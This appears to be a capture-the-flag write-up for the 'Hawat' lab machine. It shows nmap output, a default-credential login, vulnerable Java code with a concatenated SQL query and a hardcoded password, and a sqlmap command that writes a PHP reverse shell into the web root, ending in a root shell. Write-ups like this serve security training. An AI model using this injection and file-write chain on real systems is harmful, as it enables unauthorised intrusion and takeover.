---
layout: post
category: writeup
---

## Machine Info

- Name: Hawat
- Description: 1.21 GigHawats
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT      STATE  SERVICE      VERSION
22/tcp    open   ssh          OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
|_  256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
17445/tcp open   unknown
| fingerprint-strings: 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 29 Jan 2024 16:39:57 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
30455/tcp open   http         nginx 1.18.0
|_http-title: W3.CSS
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.18.0
50080/tcp open   http         Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
```

We have 3 websites, on random ports, let's dirsearch:

![](assets/images/2024-01-29-OFFSEC-hawat-writeup-image-1.png)

![](assets/images/2024-01-29-OFFSEC-hawat-writeup-image-2.png)

I attempt to login to this cloud instance with creds: `admin:admin`

It works and I find a zip file for the application on the 17445.

![](assets/images/2024-01-29-OFFSEC-hawat-writeup-image-3.png)

```java
public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
                    Statement stmt = conn.createStatement();
                    stmt.executeQuery(query);

        } catch (SQLException e1) {
                        // TODO Auto-generated catch block
                        e1.printStackTrace();
                }
```

I see there is a sqlinjection in this function when accessing the /issue/CheckByPriority in the priority field. I will exploit this by using sqlmap:

```bash
sqlmap -r sql.req  -p priority --file-write net/rev.php --file-dest /srv/http/rev.php
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.9#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:23:02 /2024-01-29/

[14:23:02] [INFO] parsing HTTP request from 'sql.req'
[14:23:02] [INFO] resuming back-end DBMS 'mysql' 
[14:23:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: priority (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: priority=Normal' AND (SELECT 8842 FROM (SELECT(SLEEP(5)))btrU)-- jECY
---
[14:23:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:23:02] [INFO] fingerprinting the back-end DBMS operating system
[14:23:02] [INFO] the back-end DBMS operating system is Linux
[14:23:03] [WARNING] expect junk characters inside the file as a leftover from original query
do you want confirmation that the local file 'net/rev.php' has been successfully written on the back-end DBMS file system ('/srv/http/rev.php')? [Y/n] Y
[14:23:04] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[14:23:10] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
11
[14:23:29] [INFO] adjusting time delay to 4 seconds due to good response times
7
[14:23:34] [INFO] the remote file '/srv/http/rev.php' is larger (117 B) than the local file 'net/rev.php' (74B)
[14:23:34] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.174.147'

[*] ending @ 14:23:34 /2024-01-29/
```

I also checked phpinfo on 30455 and saw that the directory it was hosted in is /srv/http so I uploaded the file there and got a shell

```bash
[root@hawat http]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@hawat http]#
```
## Privilege Escalation

No privesc needed, spawned as root!

best,
gerbsec